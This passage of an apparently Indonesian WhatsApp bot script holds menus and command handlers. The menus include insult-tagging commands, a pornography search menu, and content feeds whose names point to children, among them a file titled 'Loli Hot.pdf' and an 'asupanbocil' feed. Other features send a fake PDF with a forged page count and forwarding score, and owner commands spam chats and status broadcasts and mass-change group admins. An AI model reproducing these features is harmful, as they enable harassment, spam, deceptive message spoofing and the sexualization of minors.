${garis + kotak} ${prefix}pakgirl
${garis + kotak} ${prefix}sadboy
${garis + kotak} ${prefix}sadgirl
${garis + kotak} ${prefix}wibu
${garis + kotak} ${prefix}nolep
${garis + kotak} ${prefix}hebat
${bawah}

${atas}
${bates} *V MENU* 👥
${garis + kotak} ${prefix}vsadboy
${garis + kotak} ${prefix}vpakboy
${garis + kotak} ${prefix}vbaik
${garis + kotak} ${prefix}vjago
${garis + kotak} ${prefix}vjelek
${garis + kotak} ${prefix}vcantik
${garis + kotak} ${prefix}vpinter
${garis + kotak} ${prefix}vbeban
${garis + kotak} ${prefix}vkontol
${garis + kotak} ${prefix}vhebat
${garis + kotak} ${prefix}vwibu
${garis + kotak} ${prefix}vharam
${garis + kotak} ${prefix}vbabi
${garis + kotak} ${prefix}vbego
${garis + kotak} ${prefix}vganteng
${garis + kotak} ${prefix}vanjing
${garis + kotak} ${prefix}vmonyet
${garis + kotak} ${prefix}vsadgirl
${garis + kotak} ${prefix}vpakgirl
${garis + kotak} ${prefix}vjahat
${garis + kotak} ${prefix}vnolep
${garis + kotak} ${prefix}vgoblok
${bawah}

${atas}
${bates} *X MENU* 👥
${garis + kotak} ${prefix}xsadboy <@tag>
${garis + kotak} ${prefix}xpakboy <@tag>
${garis + kotak} ${prefix}xbaik <@tag>
${garis + kotak} ${prefix}xjago <@tag>
${garis + kotak} ${prefix}xjelek <@tag>
${garis + kotak} ${prefix}xcantik <@tag>
${garis + kotak} ${prefix}xpinter <@tag>
${garis + kotak} ${prefix}xbeban <@tag>
${garis + kotak} ${prefix}xkontol <@tag>
${garis + kotak} ${prefix}xhebat <@tag>
${garis + kotak} ${prefix}xwibu <@tag>
${garis + kotak} ${prefix}xharam <@tag>
${garis + kotak} ${prefix}xbabi <@tag>
${garis + kotak} ${prefix}xbego <@tag>
${garis + kotak} ${prefix}xganteng <@tag>
${garis + kotak} ${prefix}xanjing <@tag>
${garis + kotak} ${prefix}xmonyet <@tag>
${garis + kotak} ${prefix}xsadgirl <@tag>
${garis + kotak} ${prefix}xpakgirl <@tag>
${garis + kotak} ${prefix}xjahat <@tag>
${garis + kotak} ${prefix}xnolep <@tag>
${garis + kotak} ${prefix}xgoblok <@tag>
${bawah}

${atas}
${bates} *Z MENU* 👥
${garis + kotak} ${prefix}zsadboy
${garis + kotak} ${prefix}zpakboy
${garis + kotak} ${prefix}zbaik
${garis + kotak} ${prefix}zjago
${garis + kotak} ${prefix}zjelek
${garis + kotak} ${prefix}zcantik
${garis + kotak} ${prefix}zpinter
${garis + kotak} ${prefix}zbeban
${garis + kotak} ${prefix}zkontol
${garis + kotak} ${prefix}zhebat
${garis + kotak} ${prefix}zwibu
${garis + kotak} ${prefix}zharam
${garis + kotak} ${prefix}zbabi
${garis + kotak} ${prefix}zbego
${garis + kotak} ${prefix}zganteng
${garis + kotak} ${prefix}zanjing
${garis + kotak} ${prefix}zmonyet
${garis + kotak} ${prefix}zsadgirl
${garis + kotak} ${prefix}zpakgirl
${garis + kotak} ${prefix}zjahat
${garis + kotak} ${prefix}znolep
${garis + kotak} ${prefix}zgoblok
${bawah}

${atas}
${bates} *CEK MENU* ✔️
${garis + kotak} ${prefix}gantengcek
${garis + kotak} ${prefix}cantikcek
${garis + kotak} ${prefix}jelekcek
${garis + kotak} ${prefix}goblokcek
${garis + kotak} ${prefix}begocek
${garis + kotak} ${prefix}pintercek
${garis + kotak} ${prefix}jagocek
${garis + kotak} ${prefix}nolepcek
${garis + kotak} ${prefix}babicek
${garis + kotak} ${prefix}bebancek
${garis + kotak} ${prefix}baikcek
${garis + kotak} ${prefix}jahatcek
${garis + kotak} ${prefix}anjingcek
${garis + kotak} ${prefix}haramcek
${garis + kotak} ${prefix}kontolcek
${garis + kotak} ${prefix}pakboycek
${garis + kotak} ${prefix}pakgirlcek
${garis + kotak} ${prefix}sangecek
${garis + kotak} ${prefix}bapercek
${bawah}

${atas}
${bates} *STICKER MENU* 📌
${garis + kotak} ${prefix}pmeme < reply foto text1|text2 >
${garis + kotak} ${prefix}smeme < reply stiker text1|text2 >
${garis + kotak} ${prefix}sticker < ReplyFoto >
${garis + kotak} ${prefix}sgif < ReplyVideo >
${garis + kotak} ${prefix}ttp [_teks_]
${garis + kotak} ${prefix}attp [_teks_]
${bawah}

${atas}
${bates} *OTHER MENU* 🔓
${garis + kotak} ${prefix}donasi
${garis + kotak} ${prefix}script
${garis + kotak} ${prefix}runtime
${garis + kotak} ${prefix}speed
${garis + kotak} ${prefix}afk < alasan >
${garis + kotak} ${prefix}rules
${garis + kotak} ${prefix}snk
${bawah}

${atas}
${bates} *GACHA CECANS MENU* 😍
${garis + kotak} ${prefix}vietnam
${garis + kotak} ${prefix}korea
${garis + kotak} ${prefix}china
${garis + kotak} ${prefix}indonesia
${garis + kotak} ${prefix}malaysia
${garis + kotak} ${prefix}japan
${garis + kotak} ${prefix}thailand
${bawah}

${atas}
${bates} *18+ SOUND MENU* 😍
${garis + kotak} ${prefix}cersex [_search_]
${garis + kotak} ${prefix}hentai [_search_]
${garis + kotak} ${prefix}nekoh
${garis + kotak} ${prefix}bokep [_search_]
${garis + kotak} ${prefix}asupanbokep
${garis + kotak} ${prefix}sound 1 s/d 68
${garis + kotak} ${prefix}sholawat
${garis + kotak} ${prefix}araara
${garis + kotak} ${prefix}baka
${garis + kotak} ${prefix}susu
${garis + kotak} ${prefix}sarange
${garis + kotak} ${prefix}ngaji2
${garis + kotak} ${prefix}tilawah
${garis + kotak} ${prefix}pale
${garis + kotak} ${prefix}hallo
${garis + kotak} ${prefix}magic
${garis + kotak} ${prefix}sowell
${garis + kotak} ${prefix}beb
${bawah}

${atas}
${bates} *ASUPAN MENU* 😍
${garis + kotak} ${prefix}asupan
${garis + kotak} ${prefix}asupancecan
${garis + kotak} ${prefix}asupanhijaber
${garis + kotak} ${prefix}asupansantuy
${garis + kotak} ${prefix}asupanukhti
${garis + kotak} ${prefix}asupanbocil
${garis + kotak} ${prefix}asupanghea
${garis + kotak} ${prefix}asupanrika
${bawah}

║▌│█║▌│ █║▌│█│║▌║
║▌│█║▌│ █║▌│█│║▌║

    © *${NamaOwner}*`, fs.readFileSync('./media/Loli Hot.pdf'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/pdf.jpg'), filename:`${FakePdf}`, pageCount: 9999999 }, [{buttonId:`!script`,buttonText:{displayText:'Ok'},type:1}], {quoted:floc3, contextInfo: { mentionedJid: [utod,stod,ptod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${FakeYt}`,mediaType:"2",thumbnail:fs.readFileSync('./media/yt.jpg'),mediaUrl:`https://youtu.be/c/btrchannel`}}})
            break

//═════════════════════════ [ DOWNLOAD MENU ] ═════════════════════════
//═════════════════════════ [ COPAS AJA ] ════════════════════════
//═════════════════════════ [ API RANDOM ] ═════════════════════════
//ownermenu
case 'anticall':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Select on or off')
if (args[0] === "on") {
if(antical)return reply('It has been activated before!')
antical = true
reply(`Succesfully activated anticall`)
} else if (args[0] === "off") {
if(!antical)return reply('It has been deactivated before!')
antical = false
reply(`Successfully turned off anticall`)
} else {
reply(`Select on or off`)
}
break

case 'autoread':
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readGc === true) return
readGc = true
reply(`Succesfully activated autoread group`)
} else if (args[1] === "off") {
if (readGc === false) return
readGc = false
reply(`Successfully turned off autoread group`)
} else {
reply(`Select on or off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readPc === true) return
readPc = true
reply(`Succesfully activated autoread pc`)
} else if (args[1] === "off") {
if (readPc === false) return
readPc = false
reply(`Successfully turned off autoread pc`)
} else {
reply(`Select on or off`)
}
} else {
reply(`*List Auto Read*\n•> gc\n•> pc`)
}
break
       case 'autotype':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply('Choose on or off')
if (args[0] === "on") {
if (autoketik === true) return
autoketik = true
reply(`Success activate autotype`)
} else if (args[0] === "off") {
if (autoketik === false) return
autoketik = false
reply(`Success turns off autotype`)
} else {
reply(`Choose on or off`)
}
break
case 'autovn':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply('Select on or off')
if (args[0] === "on") {
if (autovn === true) return
autovn = true
reply(`Succesfully activated autovn`)
} else if (args[0] === "off") {
if (autovn === false) return
autovn = false
reply(`Successfully turned off autovn`)
} else {
reply(`Select on or off`)
}
break
      case "autojoin":
        if (!isGroup) return reply("Group only");
        if (!mek.key.fromMe) return reply("This feature is only for the owner");
        if (args[0] == "on") {
          if (autojoin == true) return reply("Activated!!");
          autojoin = true;
          reply("Successfully activated autojoin!");
        } else if (args[0] == "off") {
          autojoin = false;
          reply("Successfully turned off autojoin!");
        } else if (!q) {
          sendButMessage(from, `MODE AUTOJOIN`, `Please choose one`, [
            {
              buttonId: `autojoin on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `autojoin off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "kickarea":
        if (!isGroup) return reply("Group only");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("admin only");
        if (args[0] == "on") {
          if (isKickarea) return reply("Activated!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./storage/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Successfully activated kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./storage/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Successfully turned off kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Please choose one`, [
            {
              buttonId: `kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'addrespon':
			if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
				argz = arg.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return reply(`Udah ada`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				reply(`Sukses menambahkan respon ${argz[0]}`)
				break
			case 'delrespon':
			if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
				if (!checkCommands(body.slice(11), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(11), commandsDB)
				reply(`Sukses menghapus respon ${body.slice(11)}`)
				break
				case 'listrespon':
teks = `\`\`\`「 LIST RESPON  」\`\`\`\n\n`
for (let i = 0; i < commandsDB.length; i ++){
teks += `❏ *Tanya:* ${commandsDB[i].pesan}\n`
teks += `❏ *Balasan:* ${commandsDB[i].balasan}\n`
teks += `❏ *Creator:* ${commandsDB[i].creator}\n\n`
}
reply(teks)
break
case 'delchat':
case 'delchat':

                   if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)

                reply('Sukses menghapus chat' + from)
                await sleep(4000)
                Bambang.modifyChat(from, ChatModification.delete)
                break
                case 'mute':
			    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./storage/mute.json', JSON.stringify(mute))
                reply('Bot berhasil dimute di chat ini')
                break
                case 'spam':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
					if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					Bambang.sendMessage(from, argzi[0], MessageType.text)
				}
				break
					case 'detikvn':

              encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo

					mediam = await Bambang.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						Bambang.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:ftrol})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
            encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await Bambang.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						Bambang.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: ftrol})
						fs.unlinkSync(median)
				break
			case 'listimage':
              teks = '*Image List :*\n\n'
					for (let awokwkwk of imagi) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagi.length}*\n\n_Untuk mengambil image silahkan reply pesan ini dengan caption nama image_`
					Bambang.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": imagi } })
					break
					case 'stickerlist':
				case 'liststicker':
              teks = '*Sticker List :*\n\n'
					for (let awokwkwk of setik) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setik.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
					Bambang.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": setik } })
					break
					case 'vnlist':
				case 'listvn':
              teks = '*VN List :*\n\n'
					for (let awokwkwk of vien) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${vien.length}*\n\n_Untuk mengambil vn silahkan reply pesan ini dengan caption nama vn_`
					Bambang.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": vien } })
					break
					case 'addsticker':
				if (!isQuotedSticker) return reply('Reply stiker')
					nm = body.slice(12)
					if (!nm) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await Bambang.downloadMediaMessage(boij)
					setik.push(`${nm}`)
					fs.writeFileSync(`./sticker/${nm}.webp`, delb)
					fs.writeFileSync('./storage/setik.json', JSON.stringify(setik))
					Bambang.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}liststicker*`, MessageType.text, { quoted: ftrol })
					break
					case 'delsticker':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
					try {
					 nmm = body.slice(12)
					 wanu = setik.indexOf(nmm)
					 setik.splice(wanu, 1)
					 fs.unlinkSync(`./sticker/${nmm}.webp`)
					 reply(`Sukses menghapus sticker ${body.slice(12)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
					case 'addvn':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
					if (!isQuotedAudio) return reply('Reply audio')
					nm = body.slice(7)
					if (!nm) return reply('Nama vn nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await Bambang.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./vn/${nm}.mp3`, delb)
					fs.writeFileSync('./storage/vien.json', JSON.stringify(vien))
					Bambang.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, { quoted: ftrol })
					break
					case 'delvn':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
					try {
					 nmm = body.slice(7)
					 wanu = vien.indexOf(nmm)
					 vien.splice(wanu, 1)
					 fs.unlinkSync(`./vn/${nmm}.mp3`)
					reply(`Sukses menghapus vn ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
					case 'addimage':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
					if (!isQuotedImage) return reply('Reply image')
					nm = body.slice(10)
					if (!nm) return reply('Nama image nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await Bambang.downloadMediaMessage(boij)
					imagi.push(`${nm}`)
					fs.writeFileSync(`./media/${nm}.jpg`, delb)
					fs.writeFileSync('./storage/imagi.json', JSON.stringify(imagi))
					Bambang.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listimage*`, MessageType.text, { quoted: ftrol })
					break
					case 'delimage':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
					try {
					 nmm = body.slice(10)
					 wanu = imagi.indexOf(nmm)
					 imagi.splice(wanu, 1)
					 fs.unlinkSync(`./media/${nmm}.jpg`)
					 reply(`Sukses menghapus image ${body.slice(10)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
case 'rate':
  rate = body.slice(1)
					const ra =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
					const te = ra[Math.floor(Math.random() * ra.length)]
					Bambang.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: ftrol })
					break
					case 'kapankah':
  kapankah = body.slice(1)
					const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Tidak Akan Pernah']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					Bambang.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: ftrol })
					break
					case 'apakah':
 apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi','Tanyakan Ayam']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					Bambang.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: ftrol })
					break
					case 'bisakah':
  bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','Coba Ulangi','Ngimpi kah?','yakin bisa?']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					Bambang.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: ftrol })
					break
				case 'demoteall':
		if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.bodmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                Bambang.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.bodmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                Bambang.groupMakeAdmin(from, members_id)
                break
                case 'spamsw':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					Bambang.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
                    case 'upswteks':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    Bambang.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    Bambang.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${NameBot}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                                        case 'upswsticker':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Bambang.downloadMediaMessage(encmedia)
						Bambang.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                    case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Bambang.downloadMediaMessage(encmedia)
						Bambang.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
case 'linkwa':
case 'grupwa':
case 'groupwa':
case 'gcwa':
   if(!q) return reply('cari group apa?')
            hx.linkwa(`${q}`)
            .then(result => {
            let res = '「 *GC WA* 」\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break 
            case 'chara':
		if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(`${q}`)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await Bambang.sendMessage(from,li,image,{quoted: ftrol})
            break
            case 'otaku':
        if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(`${q}`)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            Bambang.sendMessage(from,ram,image,{quoted:ftrol,caption:rem})
            break
            case 'komiku':
    if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(`${q}`)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break  
            case 'getpict':
				case 'getpic':
              if (!isGroup) return reply(mess.only.group)
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await Bambang.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            Bambang.sendMessage(from, pict, image, {quoted: ftrol})
            break
            case 'getbio':
            var yy = mek.message.extendedTextMessage.contextInfo.participant
var p = await Bambang.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply(mess.error.api)
}
break
						case 'upswvoice':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Bambang.downloadMediaMessage(encmedia)
						Bambang.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
						case 'upswvideo':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await Bambang.downloadAndSaveMediaMessage(enmediap)
                    const buffer10 = fs.readFileSync(mediap)
                    Bambang.sendMessage('status@broadcast', buffer10, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                        case 'upswgif':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Bambang.downloadAndSaveMediaMessage(enmedia)
                    const buffer11 = fs.readFileSync(media)
                    Bambang.sendMessage('status@broadcast', buffer11, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Bambang.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    Bambang.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: ftrol, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
                        case 'shutdown':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
				return Bambang.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break
				case 'online':
            if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
				offline = false
				reply('Status : ONLINE')
				break
			case 'offline':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
				offline = true
				reply('Status : OFFLINE')
				break
				                    case 'exif':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
					const exifffff = `${args.join(' ')}`
					const namaPack = exifffff.split('|')[0]
					const authorPack = exifffff.split('|')[1]
					exif.create(namaPack, authorPack)
					await reply('Done gan')
				break
				case 'setprofile':
				case 'setppbot':
				Bambang.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply imagenya!')
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await Bambang.downloadAndSaveMediaMessage(enmediau)
					await Bambang.updateProfilePicture(botNumber, mediau)
					reply('Terima Kasih Kak Pp Barunya😍')
					break
					case 'setnamebot':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
				if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                Bambang.updateProfileName(anu)
                reply(`Sukses mengganti nama ke ${body.slice(9)}`)
                break
                case 'setprefix':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
      if (args.length < 1) return reply(`Contoh ${prefix + command} multi/nopref`)
           if (q === 'multi'){
              multi = true
                    reply(`Berhasil mengubah prefix ke ${q}`)
                } else if (q === 'nopref'){
                    multi = false
                    nopref = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${q}`
                    reply(`Berhasil mengubah prefix ke ${q}`)
					}
					break
					case 'setbio':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
				if (args.length < 1) return reply('Teksnya?')
					iyek = body.slice(8)
					Bambang.setStatus(`${iyek}`)
					reply(`Sukses mengganti bio ke ${body.slice(8)}`)
					break
					case 'leave':
				if (!isGroup) return reply(mess.only.group)
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
				Bambang.updatePresence(from, Presence.composing)
				Bambang.groupLeave(from)
						break
						case 'restart':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
reply(`_Restarting ${NameBot}_`)
exec(`cd &&  node .`)
sleep(4000)
reply('Sukses')
break
case 'join':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
				 if (args.length < 1) return reply('Link nya mana?')
					Bambang.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply('Sukses bergabung dalam group')
break
case 'freeoneday':
				 if (args.length < 1) return reply('Link nya mana?')
					Bambang.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply('Sukses disewa dalam group')
break
case 'readall':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                var chats = await Bambang.chats.all()
                chats.map( async ({ jid }) => {
                await Bambang.chatRead(jid)
                })
		var teks = `\`\`\`Successfully read ${chats.length} chats !\`\`\``
	        await Bambang.sendMessage(from, teks, text, {quoted: ftrol})
		console.log(chats.length)
		break
		case 'unreadall':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                var chats = await Bambang.chats.all()
                chats.map( async ({ jid }) => {
                await Bambang.chatRead(jid, 'unread')
                    })
		    var teks = `\`\`\`Successfully unread ${chats.length} chats !\`\`\``
		    await Bambang.sendMessage(from, teks, text, {quoted: ftrol})
		    console.log(chats.length)
	        break
	case 'pin':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                Bambang.modifyChat(from, ChatModification.pin)
                reply('*succes pin this chat*')
                console.log('pinned chat = ' + from)
                break
                case 'unpin':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                Bambang.modifyChat(from, ChatModification.unpin)
